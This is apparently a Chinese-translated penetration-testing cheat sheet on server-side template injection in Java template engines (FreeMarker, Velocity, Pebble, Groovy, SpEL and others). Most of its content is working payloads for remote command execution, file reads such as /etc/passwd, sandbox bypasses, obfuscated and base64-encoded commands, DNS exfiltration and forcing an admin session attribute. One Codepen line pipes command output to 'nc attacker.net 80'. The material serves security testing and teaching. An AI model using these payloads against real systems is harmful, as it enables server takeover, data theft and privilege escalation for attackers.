[原文文档](Java.en.md)

# 服务器端模板注入 - Java

> 服务器端模板注入（SSTI）是一种安全漏洞，当用户输入以不安全的方式嵌入到服务器端模板中时发生，允许攻击者注入和执行任意代码。在Java中，SSTI可能特别危险，因为基于Java的模板引擎（如JSP（JavaServer Pages）、Thymeleaf和FreeMarker）的强大功能和灵活性。

## 概述

- [模板库](#模板库)
- [Java](#java)
    - [Java - 基本注入](#java---基本注入)
    - [Java - 检索环境变量](#java---检索环境变量)
    - [Java - 检索/etc/passwd](#java---检索etcpasswd)
- [Freemarker](#freemarker)
    - [Freemarker - 基本注入](#freemarker---基本注入)
    - [Freemarker - 读取文件](#freemarker---读取文件)
    - [Freemarker - 代码执行](#freemarker---代码执行)
    - [Freemarker - 沙盒绕过](#freemarker---沙盒绕过)
- [Codepen](#codepen)
- [Jinjava](#jinjava)
    - [Jinjava - 基本注入](#jinjava---基本注入)
    - [Jinjava - 命令执行](#jinjava---命令执行)
- [Pebble](#pebble)
    - [Pebble - 基本注入](#pebble---基本注入)
    - [Pebble - 代码执行](#pebble---代码执行)
- [Velocity](#velocity)
- [Groovy](#groovy)
    - [Groovy - 基本注入](#groovy---基本注入)
    - [Groovy - 读取文件](#groovy---读取文件)
    - [Groovy - HTTP请求](#groovy---http请求)
    - [Groovy - 命令执行](#groovy---命令执行)
    - [Groovy - 沙盒绕过](#groovy---沙盒绕过)
- [Spring Expression Language](#spring-expression-language)
    - [SpEL - 基本注入](#spel---基本注入)
    - [SpEL - DNS泄露](#spel---dns泄露)
    - [SpEL - 会话属性](#spel---会话属性)
    - [SpEL - 命令执行](#spel---命令执行)
- [参考资料](#参考资料)

## 模板库

| 模板名称 | 负载格式 |
| ------------ | --------- |
| Codepen    | `#{}`     |
| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy     | `${9*9}`  |
| Jinjava    | `{{ }}`   |
| Pebble     | `{{ }}`   |
| Spring     | `*{7*7}`  |
| Thymeleaf  | `[[ ]]`   |
| Velocity   | `#set($X="") $X`             |

## Java

### Java - 基本注入

> 可以使用多个变量表达式，如果`${...}`不起作用，请尝试`#{...}`，`*{...}`，`@{...}`或`~{...}`。

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java - 检索环境变量

```java
${T(java.lang.System).getenv()}
```

### Java - 检索/etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

---

## Freemarker

[官方网站](https://freemarker.apache.org/)
> Apache FreeMarker™是一个模板引擎：基于模板和变化数据生成文本输出（HTML网页、电子邮件、配置文件、源代码等）的Java库。

你可以在[https://try.freemarker.apache.org](https://try.freemarker.apache.org)测试你的负载

### Freemarker - 基本注入

模板可以是：

- 默认：`${3*3}`  
- 传统：`#{3*3}`
- 替代：`[=3*3]` 自[FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)以来

### Freemarker - 读取文件

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
将返回的字节转换为ASCII
```

### Freemarker - 代码执行

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### Freemarker - 沙盒绕过

:warning: 仅适用于低于2.3.30版本的Freemarker

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Codepen

[官方网站](https://codepen.io/)
>

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

---

## Jinjava

[官方网站](https://github.com/HubSpot/jinjava)
> 基于Java的模板引擎，基于django模板语法，适用于渲染jinja模板（至少是HubSpot内容中使用的jinja子集）。

### Jinjava - 基本注入

```python
{{'a'.toUpperCase()}} 将导致 'A'
{{ request }} 将返回一个请求对象，如com.[...].context.TemplateContextRequest@23548206
```

Jinjava是Hubspot开发的开源项目，可在[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)获得

### Jinjava - 命令执行

由[HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)修复

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble

[官方网站](https://pebbletemplates.io/)

> Pebble是一个受[Twig](./PHP.md#twig)启发的Java模板引擎，类似于Python [Jinja](./Python.md#jinja2)模板引擎语法。它具有模板继承和易于阅读的语法，内置自动转义以确保安全，并包含对国际化的集成支持。

### Pebble - 基本注入

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - 代码执行

Pebble的旧版本（<3.0.9版本）：`{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`。

Pebble的新版本：

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity

[官方网站](https://velocity.apache.org/engine/1.7/user-guide.html)

> Apache Velocity是一个基于Java的模板引擎，允许Web设计人员直接在模板中嵌入Java代码引用。

在易受攻击的环境中，Velocity的表达式语言可以被滥用以实现远程代码执行（RCE）。例如，此负载执行whoami命令并打印结果：

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

支持base64编码命令的更灵活和隐蔽的负载，允许执行任意shell命令，如`echo "a" > /tmp/a`。以下是使用base64中`whoami`的示例：

```java
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

---

## Groovy

[官方网站](https://groovy-lang.org/)

### Groovy - 基本注入

参考[groovy-lang.org/syntax](https://groovy-lang.org/syntax.html)，但`${9*9}`是基本注入。

### Groovy - 读取文件

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP请求

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - 命令执行

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - 沙盒绕过

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

或者

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Spring Expression Language

[官方网站](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)

> Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于统一EL，但提供额外功能，最值得注意的是方法调用和基本字符串模板功能。

### SpEL - 基本注入

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
```

### SpEL - DNS泄露

DNS查找

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### SpEL - 会话属性

修改会话属性

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### SpEL - 命令执行

- 使用`java.lang.Runtime`的方法#1 - 通过JavaClass访问

    ```java
    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
    ```

- 使用`java.lang.Runtime`的方法#2

    ```java
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
    ```

- 使用`java.lang.Runtime`的方法#3 - 通过`invoke`访问

    ```java
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
    ```

- 使用`java.lang.Runtime`的方法#3 - 通过`javax.script.ScriptEngineManager`访问

    ```java
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
    ```

- 使用`java.lang.ProcessBuilder`的方法

    ```java
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("ping x.x.x.x")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}
    ```

## 参考资料

- [服务器端模板注入 – 以Pebble为例 - Michał Bentkowski - 2019年9月17日](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
- [服务器端模板注入：现代Web应用程序的RCE - James Kettle (@albinowax) - 2015年12月10日](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
- [服务器端模板注入：现代Web应用程序的RCE（PDF） - James Kettle (@albinowax) - 2015年8月8日](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [服务器端模板注入：现代Web应用程序的RCE（视频） - James Kettle (@albinowax) - 2015年12月28日](https://www.youtube.com/watch?v=3cT0uE7Y87s)
- [VelocityServlet表达式语言注入 - MagicBlue - 2017年11月15日](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
- [Bean Stalking：将Java beans扩展为RCE - Alvaro Munoz - 2020年7月7日](https://securitylab.github.com/research/bean-validation-RCE)
- [错误报告：通过SSTI在Spring Boot错误页面上的RCE与Akamai WAF绕过 - Peter M (@pmnh_) - 2022年12月4日](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
- [表达式语言注入 - OWASP - 2019年12月4日](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [表达式语言注入 - PortSwigger - 2019年1月27日](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [利用Spring表达式语言（SpEL）注入漏洞（又称Magic SpEL）获取RCE - Xenofon Vassilakopoulos - 2021年11月18日](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [Hubspot中的RCE，通过HubL中的EL注入 - @fyoorer - 2018年12月7日](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
- [使用EL注入漏洞进行远程代码执行 - Asif Durani - 2019年1月29日](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)